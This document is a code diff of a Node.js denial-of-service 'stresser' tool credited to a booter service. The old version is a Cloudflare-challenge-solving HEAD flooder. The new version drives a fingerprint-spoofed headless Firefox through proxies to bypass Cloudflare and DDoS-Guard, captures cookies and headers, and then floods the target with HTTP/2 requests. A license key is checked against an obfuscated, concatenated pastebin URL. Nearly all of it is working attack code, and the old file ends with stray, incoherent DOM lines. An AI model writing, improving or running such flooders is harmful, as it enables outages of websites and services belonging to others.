@@ -1,308 +1,448 @@
-process.on('uncaughtException', (err) => {});
-process.on('unhandledRejection', (err) => {});
-var vm = require('vm');
-var requestModule = require('request');
-var jar = requestModule.jar();
-var fs = require('fs');
-var proxies = fs.readFileSync(process.argv[4], 'utf-8').replace(/\r/g, '').split('\n');
- 
-function arrremove(arr, what) {
-    var found = arr.indexOf(what);
- 
-    while (found !== -1) {
-        arr.splice(found, 1);
-        found = arr.indexOf(what);
-    }
-}
- 
-var request = requestModule.defaults({
-        jar: jar
-    }),
-    UserAgent = 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
-    Timeout = 6000,
-    WAF = true,
-    cloudscraper = {};
- 
- 
- 
-var cookies = [];
- 
-cloudscraper.get = function(url, callback, headers) {
-    performRequest({
-        method: 'HEAD',
-        url: url,
-        headers: headers
-    }, callback);
+const { firefox } = require('playwright-extra');
+const { FingerprintGenerator } = require('./fingerprint-generator/index.js');
+const { FingerprintInjector }  = require('./fingerprint-injector/index.js');
+
+const { UAParser } = require('ua-parser-js');
+const { Cookie, CookieJar } = require('tough-cookie');
+const http = require('http');
+const { PassThrough } = require('stream');
+
+const fs = require('fs');
+const requests = require('request');
+const url = require('url');
+
+const dns = require('dns');
+const tls = require('tls');
+const http2 = require('http2');
+const EventEmitter = require('events');
+const JSStreamSocket = (new tls.TLSSocket(new PassThrough()))._handle._parentWrap.constructor;
+
+const emitter = new EventEmitter();
+emitter.setMaxListeners(Number.POSITIVE_INFINITY);
+process.setMaxListeners(0);
+const sdasd = 'https://'
+const qaiwdhjuwdj = 'p';
+const uqwdf = 'aste';
+const msidstressgay = 'bin';
+const meowgay = '.';
+const meowmsidstressgay = 'c';
+const kkkkkkkkas = 'om';
+const rawseajd = '/ra';
+const aosdokawod = 'w/';
+const oooooaasdas = 'b5UuNZRL';
+
+
+/*
+
+				MADE BY @MSIDSTRESS [ FOR STRESSHIT.CLUB ]
+			[HTTP-PROXY]
+						BYPASS DDOS-GUARD
+								BYPASS CLOUDFLARE	
+											BYPASS HTTP-DDOS
+			Regards, @MSIDSTRESS [NXVER];
+				
+				
+*/
+
+
+protone = {
+    url: sdasd + qaiwdhjuwdj + uqwdf + msidstressgay + meowgay + meowmsidstressgay + kkkkkkkkas + rawseajd + aosdokawod + oooooaasdas
 };
- 
-cloudscraper.post = function(url, body, callback, headers) {
-    var data = '',
-        bodyType = Object.prototype.toString.call(body);
- 
-    if (bodyType === '[object String]') {
-        data = body;
-    } else if (bodyType === '[object Object]') {
-        data = Object.keys(body).map(function(key) {
-            return key + '=' + body[key];
-        }).join('&');
-    }
- 
-    headers = headers || {};
-    headers['Content-Type'] = headers['Content-Type'] || 'application/x-www-form-urlencoded; charset=UTF-8';
-    headers['Content-Length'] = headers['Content-Length'] || data.length;
- 
-    performRequest({
-        method: 'HEAD',
-        body: data,
-        url: url,
-        headers: headers
-    }, callback);
-}
- 
-cloudscraper.request = function(options, callback) {
-    performRequest(options, callback);
-}
- 
-function performRequest(options, callback) {
-    var method;
-    options = options || {};
-    options.headers = options.headers || {};
- 
-    options.headers['Cache-Control'] = options.headers['Cache-Control'] || 'private';
-    options.headers['Accept'] = options.headers['Accept'] || 'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5';
- 
-    makeRequest = requestMethod(options.method);
- 
-    if ('encoding' in options) {
-        options.realEncoding = options.encoding;
-    } else {
-        options.realEncoding = 'utf8';
-    }
-    options.encoding = null;
- 
-    if (!options.url || !callback) {
-        throw new Error('To perform request, define both url and callback');
-    }
- 
-    options.headers['User-Agent'] = options.headers['User-Agent'] || UserAgent;
- 
-    makeRequest(options, function(error, response, body) {
-        var validationError;
-        var stringBody;
- 
-        if (error || !body || !body.toString) {
-            return callback({
-                errorType: 0,
-                error: error
-            }, body, response);
-        }
- 
-        stringBody = body.toString('utf8');
- 
-        if (validationError = checkForErrors(error, stringBody)) {
-            return callback(validationError, body, response);
-        }
- 
-        if (stringBody.indexOf('a = document.getElementById(\'jschl-answer\');') !== -1) {
-            setTimeout(function() {
-                return solveChallenge(response, stringBody, options, callback);
-            }, Timeout);
-        } else if (stringBody.indexOf('You are being redirected') !== -1 ||
-            stringBody.indexOf('sucuri_cloudproxy_js') !== -1) {
-            setCookieAndReload(response, stringBody, options, callback);
+
+function getArgs() {
+    const _0 = {};
+    process.argv.slice(2, process.argv.length).forEach((_1) => {
+        if (_1.slice(0, 2) === '--') {
+            const _3 = _1.split('=');
+            const _4 = _3[0].slice(2, _3[0].length);
+            const _5 = _3.length > 1 ? _3[1] : true;
+            _0[_4] = _5
         } else {
-            processResponseBody(options, error, response, body, callback);
+            if (_1[0] === '-') {
+                const _2 = _1.slice(1, _1.length).split('');
+                _2.forEach((_1) => {
+                    _0[_1] = true
+                })
+            }
         }
     });
+    return _0
 }
- 
-function checkForErrors(error, body) {
-    var match;
- 
-    if (error) {
-        return {
-            errorType: 0,
-            error: error
-        };
-    }
- 
-    if (body.indexOf('why_captcha') !== -1 || /cdn-cgi\/l\/chk_captcha/i.test(body)) {
-        return {
-            errorType: 1
-        };
-    }
- 
-    match = body.match(/<\w+\s+class="cf-error-code">(.*)<\/\w+>/i);
- 
-    if (match) {
-        return {
-            errorType: 2,
-            error: parseInt(match[1])
-        };
-    }
- 
-    return false;
+const args = getArgs();
+
+if(args['debug'] == 'true') {
+	process.on('uncaughtException', function(error) {console.log(error)});
+	process.on('unhandledRejection', function(error) {console.log(error)})
+	
+} else { 
+	process.on('uncaughtException', function(error) {});
+	process.on('unhandledRejection', function(error) {})
 }
- 
- 
-function solveChallenge(response, body, options, callback) {
-    var challenge = body.match(/name="jschl_vc" value="(\w+)"/),
-        host = response.request.host,
-        makeRequest = requestMethod(options.method),
-        jsChlVc,
-        answerResponse,
-        answerUrl;
- 
-    if (!challenge) {
-        return callback({
-            errorType: 3,
-            error: 'I cant extract challengeId (jschl_vc) from page'
-        }, body, response);
-    }
- 
-    jsChlVc = challenge[1];
- 
-    challenge = body.match(/getElementById\('cf-content'\)[\s\S]+?setTimeout.+?\r?\n([\s\S]+?a\.value =.+?)\r?\n/i);
- 
-    if (!challenge) {
-        return callback({
-            errorType: 3,
-            error: 'I cant extract method from setTimeOut wrapper'
-        }, body, response);
-    }
- 
-    challenge_pass = body.match(/name="pass" value="(.+?)"/)[1];
- 
-    challenge = challenge[1];
- 
-    challenge = challenge.replace(/a\.value =(.+?) \+ .+?;/i, '$1');
- 
-    challenge = challenge.replace(/\s{3,}[a-z](?: = |\.).+/g, '');
-    challenge = challenge.replace(/'; \d+'/g, '');
- 
-    try {
-        answerResponse = {
-            'jschl_vc': jsChlVc,
-            'jschl_answer': (eval(challenge) + response.request.host.length),
-            'pass': challenge_pass
-        };
-    } catch (err) {
-        return callback({
-            errorType: 3,
-            error: 'Error occurred during evaluation: ' + err.message
-        }, body, response);
-    }
- 
-    answerUrl = response.request.uri.protocol + '//' + host + '/cdn-cgi/l/chk_jschl';
- 
-    options.headers['Referer'] = response.request.uri.href;
-    options.url = answerUrl;
-    options.qs = answerResponse;
- 
-    makeRequest(options, function(error, response, body) {
- 
-        if (error) {
-            return callback({
-                errorType: 0,
-                error: error
-            }, response, body);
-        }
- 
-        if (response.statusCode === 302) {
-            options.url = response.headers.location;
-            delete options.qs;
-            makeRequest(options, function(error, response, body) {
-                processResponseBody(options, error, response, body, callback);
-            });
+
+if (args['key'] != undefined & args['target'] != undefined & args['time'] != undefined & args['threads'] != undefined & args['requests'] != undefined & args['mode'] != undefined & args['proxy'] != undefined) {
+    requests["get"](protone, function(one, two, three) {
+        if (args['key'] == three) {
+			for(let th = 0; th < threads; th++) {
+				main(target, time, threads, ratelimiting, mode, proxies);
+			}
         } else {
-            processResponseBody(options, error, response, body, callback);
+            console.log('--> Invalid Key');
         }
-    });
+    })
+} else {
+    console.log(' --> (--key= --target= --time= --threads= --requests= --mode= --proxy=) [Made by @MSIDSTRESS]');
+    process.exit(-1);
 }
- 
-function setCookieAndReload(response, body, options, callback) {
-    var challenge = body.match(/S='([^']+)'/);
-    var makeRequest = requestMethod(options.method);
- 
-    if (!challenge) {
-        return callback({
-            errorType: 3,
-            error: 'I cant extract cookie generation code from page'
-        }, body, response);
-    }
- 
-    var base64EncodedCode = challenge[1];
-    var cookieSettingCode = new Buffer(base64EncodedCode, 'base64').toString('ascii');
- 
-    var sandbox = {
-        location: {
-            reload: function() {}
-        },
-        document: {}
-    };
-    vm.runInNewContext(cookieSettingCode, sandbox);
-    try {
-        cookies.push(sandbox.document.cookie);
-        jar.setCookie(sandbox.document.cookie, response.request.uri.href, {
-            ignoreError: true
-        });
-    } catch (err) {
-        return callback({
-            errorType: 3,
-            error: 'Error occurred during evaluation: ' + err.message
-        }, body, response);
-    }
- 
-    makeRequest(options, function(error, response, body) {
-        if (error) {
-            return callback({
-                errorType: 0,
-                error: error
-            }, response, body);
-        }
-        processResponseBody(options, error, response, body, callback);
-    });
+
+var jshead = '';
+var target = args['target'];
+var time = args['time'];
+var threads = args['threads'];
+var ratelimiting = args['requests'];
+var mode = args['mode'];
+var proxyfile = args['proxy'];
+const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);
+
+console.clear();
+console.log('--> Browser launch');
+
+async function newBrowser(proxy) {
+	try {
+		const fingerprintGenerator = new FingerprintGenerator();
+
+		const browserFingerprintWithHeaders = fingerprintGenerator.getFingerprint({
+			browsers: [{ name: 'firefox', minVersion: 89}],	
+		});
+
+		for (let i = 0; i < 10; i++) {
+			fingerprintGenerator.getFingerprint();
+		}
+
+		const fingerprintInjector = new FingerprintInjector();
+		const { fingerprint } = browserFingerprintWithHeaders;
+
+		const addd = fingerprint.navigator.userAgent;
+		console.log('--> User-Agent: ' + addd);
+		const locales = fingerprint.navigator.language
+
+		const browser = await firefox.launch({
+			proxy: { 
+				server: 'http://' + proxy
+			},	
+			args: [
+				'--disable-blink-features=AutomationControlled', 
+				'--disable-features=IsolateOrigins,site-per-process', 
+				'--renderer-process-limit=1',
+				'--mute-audio', 
+				'--disable-setuid-sandbox', 
+				'--enable-webgl', 
+				'--ignore-certificate-errors',
+				'--use-gl=disabled',
+				'--color-scheme=dark',
+				'--user-agent=' + addd,
+			],
+			ignoreDefaultArgs: ['--enable-automation'],
+			headless: true,
+			javaScriptEnabled: true,
+		})
+		const context = await browser.newContext({locale: locales, viewport: fingerprint.screen });
+		
+		await fingerprintInjector.attachFingerprintToPlaywright(context, browserFingerprintWithHeaders);
+
+		const parser = new UAParser();
+		parser.setUA(addd);
+		const result = parser.getResult();
+
+		context.addInitScript(() => {
+			window.rand_data = {
+				t: 0,
+				i: 0
+			};
+
+			const _setTimeout = setTimeout;
+			window.setTimeout = function(a, r, args) {
+				_setTimeout(a, r, args)
+				window.rand_data.t++;
+				_setTimeout(() => window.rand_data.t--, r)
+			}
+			const _setInterval = setInterval;
+			window.setInterval = function(a, r, args) {
+				window.rand_data.i++;
+				_setInterval(a, r, args)
+			}
+		})
+
+		//context.setExtraHTTPHeaders({ 'sec-ch-ua': `"Not A;Brand";v="8", "Chromium";v="${result.browser.major}", "Google Chrome";v="${result.browser.major}"` })		
+		
+		return { browser, context, fingerprint }
+	} catch (reload) { 
+		main(target, time, threads, ratelimiting, mode, proxies);  
+		console.log('--> Reason: Context Error');
+	}
 }
- 
-function requestMethod(method) {
-    method = method.toUpperCase();
- 
-    return method === 'HEAD' ? request.post : request.get;
+
+async function newPage(context, addd, locales, screen) {
+	try {
+		const page = await context.newPage({locale: locales, deviceScaleFactor: 1});
+		await page.setViewportSize({ width: screen.width, height: screen.height })
+
+		await page.route('***', route => route.continue())
+
+		return page
+	} catch (reload) { 
+		main(target, time, threads, ratelimiting, mode, proxies);  
+		console.log('--> Reason: Page Error');
+	}
 }
- 
-function processResponseBody(options, error, response, body, callback) {
-    if (typeof options.realEncoding === 'string') {
-        body = body.toString(options.realEncoding);
-        if (validationError = checkForErrors(error, body)) {
-            return callback(validationError, response, body);
-        }
-    }
- 
- 
-    callback(error, response, body);
+
+async function navigatePage(page, target, context, proxy, browser) {
+	try {
+		const parsed = url.parse(target);
+		const gotoUrl = target;
+		async function goto(gotoUrl) {
+			try {
+				const response = await page.goto(gotoUrl, { waitUntil: 'commit', timeout: 15000 });					 				
+				await page.waitForTimeout(8888);
+				await page.goto(gotoUrl, { waitUntil: 'commit', timeout: 15000 });
+				await page.waitForTimeout(9999);
+				return response
+			} catch (omg) {
+				console.log('--> Reason: Connect Error');			
+				await browser.close();	
+				await context.close();					
+				main(target, time, threads, ratelimiting, mode, proxies); 				
+			}			
+		}	
+		
+		page.on('response', resp => {
+			jshead = resp.request().headers();
+		});
+		
+		await goto(gotoUrl);
+		const cookie = (await page.context().cookies(gotoUrl)).map(c => `${c.name}=${c.value}`).join('; ');
+		const response = await goto(gotoUrl);
+		
+		if(response.status() == '503' || response.status() == '403') {
+			await browser.close();	
+			await context.close();	
+			main(target, time, threads, ratelimiting, mode, proxies);
+		}
+		
+		if(cookie) {
+			await page.waitForTimeout(2000);
+			console.log('--> Cookie: ' + cookie);
+			console.log('--> Response: ' + response.status());
+			await browser_flood(target, time, threads, ratelimiting, mode, proxy, cookie, jshead);
+		} else {
+			console.log('--> Reason: [Error] cookie');
+			await browser.close();	
+			await context.close();	
+			main(target, time, threads, ratelimiting, mode, proxies);  
+		}
+		return { response, cookie };
+	} catch (reload) {
+		console.log('--> Reason: Can`t bypass');
+		await browser.close();	
+		await context.close();	
+		main(target, time, threads, ratelimiting, mode, proxies);  
+	}		
 }
- 
-var ATTACK = {
-    cfbypass(method, url, proxy) {
-        performRequest({
-            method: method,
-            proxy: 'http://' + proxy,
-            url: url
-        }, function(err, response, body) {
-              
-        });
-    }
+
+async function main(target, time, threads, ratelimiting, mode, proxies) {
+	const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+	const { browser, context, fingerprint } = await newBrowser(proxy);
+	try {
+		const page = await newPage(context, fingerprint.userAgent, fingerprint.locale, fingerprint.screen);
+		const result = await navigatePage(page, target, context, proxy, browser);
+	} catch (err) {
+		await browser.close();
+		return main();
+	} finally {
+		await browser.close();
+	}
 }
- 
-setTimeout(function() {
-    process.exit(1);
-}, process.argv[3] * 1000);
- 
-setInterval(function() {
-    ATTACK.cfbypass('HEAD', process.argv[2], proxies[Math.floor(Math.random() * proxies.length)]);
-});
- var pagebutton= document.getElementById("login");
-pagebutton.click();
-console.log("Grabbing document details");
-sleep(3);
-console.log("Bypassing %s for %s seconds", process.argv[2], process.argv[3]);
+
+/*async function browser_flood(target, time, threads, requests, mode, proxy, cookie, getheaders) {	
+	function flood() {	
+		const url = new URL(target);
+		var parts = proxy;
+		parts = parts.split(':');	
+		let payload = {};
+		let ip = null
+
+		if (target.indexOf(".onion") != -1) {
+			ip = url.hostname
+		} else {
+			setInterval(() => {
+				dns.lookup(url.hostname, 4, (err, address, family) => {
+					ip = address
+				})
+			}, 1000)
+		}	
+		setInterval(() => {
+			const options = {
+				proxy: {
+				  host: parts[0],
+				  port: Number(parts[1]),
+				  type: 4
+				},
+			  
+				command: 'connect',
+			  
+				destination: {
+					host: ip,
+					port: url.port == '' ? (url.protocol == 'https:' ? 443 : 80) : Number(url.port)
+				}
+			};
+			SocksClient.createConnection(options, (err, info) => {
+				function sendRequest(socket) {
+						http2.connect(`http://${url.host}${url.pathname}`, {
+							createConnection: () => socket,
+							settings: {
+								headerTableSize: 65536,
+								maxConcurrentStreams: 25000,
+								initialWindowSize: 1073741823,
+								maxSessionMemory: 128000,
+								maxDeflateDynamicTableSize: 4294967295,
+								maxHeaderListSize: 262144,
+								enablePush: false
+							}
+						}, (session) => {
+							setInterval( async() => {
+								for(let i = 0; i < ratelimiting; i++) {
+									const requestHeaders = Object.assign({
+										':authority' : url.host,
+										':method': 'GET',
+										':path': url.pathname,
+										':scheme': 'https'
+									}, {
+										'user-agent': getheaders['user-agent'],
+										'accept': getheaders['accept'],
+										'accept-language': 'en-US;q=0.8,en;q=0.7',
+										'accept-encoding': 'gzip, deflate, br',
+										'cache-control': 'no-cache, no-store,private, max-age=0, must-revalidate',
+										'upgrade-insecure-requests': '1',
+										'sec-ch-ua': getheaders['sec-ch-ua'],
+										'sec-ch-ua-mobile': getheaders['sec-ch-ua-mobile'],
+										'sec-ch-ua-platform': getheaders['sec-ch-ua-platform'],										
+										'sec-fetch-dest': 'document',
+										'sec-fetch-mode': 'navigate',
+										'sec-fetch-site': 'none',
+										'x-requested-with': 'XMLHttpRequest',
+										'cookie': cookie,
+										'pragma': 'no-cache',
+										'cache-control': 'no-cache'
+										
+									})
+									await session.request(requestHeaders).close();;
+								}
+							},500);
+						}).on('error', () => {return;})
+				}
+				
+				const socket = tls.connect({
+					rejectUnauthorized: false,
+					servername: url.hostname,
+					honorCipherOrder: false, 
+					requestCert: true,
+					socket: new JSStreamSocket(info.socket),
+					secure: true,
+					ALPNProtocols: ['h2'],
+				}, () => {
+					sendRequest(socket);
+				})
+			})		
+		},500)
+	}
+	
+	setInterval(flood);
+	setTimeout(function() {
+		console.clear();
+		process.exit()
+	}, time * 1000);	
+	
+	
+}*/
+
+async function browser_flood(target, time, threads, ratelimiting, mode, proxy, cookie, jshead) {	
+	function flood() {
+		const postfunc = jshead;
+		const anomaly = cookie;
+		const url = new URL(target);		
+		var parts = proxy;
+		parts = parts.split(':'); 
+			const req = http.request({
+			  method: 'CONNECT',
+			  host: parts[0],
+			  port: parts[1],
+			  path: url.host,
+			});
+			req.end();
+		setInterval( () => {
+			req.on('connect', (err, info) => {
+				function sendRequest(socket) {
+
+					http2.connect(`http://${url.host}${url.pathname}`, {
+						createConnection: () => socket,
+						settings: {
+							headerTableSize: 65536,
+							maxConcurrentStreams: 25000,
+							initialWindowSize: 1073741823,
+							maxSessionMemory: 128000,
+							maxDeflateDynamicTableSize: 4294967295,
+							maxHeaderListSize: 262144,
+							enablePush: false
+						}
+					}, (session) => {
+						for(let i = 0; i < ratelimiting; i++) {
+								const requestHeaders = Object.assign({
+									':authority' : url.host,
+									':method': mode,
+									':path': url.pathname,
+									':scheme': 'https'
+								}, {
+									'user-agent': postfunc['user-agent'],
+									'accept': postfunc['accept'],
+									'accept-language': 'en-US;q=0.8,en;q=0.7',
+									'accept-encoding': 'gzip, deflate, br',
+									'cache-control': 'no-cache, no-store,private, max-age=0, must-revalidate',
+									'upgrade-insecure-requests': '1',
+									'sec-ch-ua': postfunc['sec-ch-ua'],
+									'sec-ch-ua-mobile': postfunc['sec-ch-ua-mobile'],
+									'sec-ch-ua-platform': postfunc['sec-ch-ua-platform'],										
+									'sec-fetch-dest': 'document',
+									'sec-fetch-mode': 'navigate',
+									'sec-fetch-site': 'none',
+									'x-requested-with': 'XMLHttpRequest',
+									'cookie': anomaly,
+									'pragma': 'no-cache',
+									'cache-control': 'no-cache'	
+								})
+							
+							const request = session.request(requestHeaders);
+							request.end();
+							return;
+						}
+					}).on('error', () => { return; })
+				}
+				
+				const socket = tls.connect({
+					rejectUnauthorized: false,
+					servername: url.hostname,
+					honorCipherOrder: false, 
+					requestCert: true,
+					socket: info,
+					secure: true,
+					ALPNProtocols: ['h2'],
+				}, () => {
+					sendRequest(socket)
+				})
+			})
+		}, 1000)
+	}
+	setInterval(flood);
+	setTimeout(function() {
+		console.clear();
+		process.exit()
+	}, time * 1000);
+}
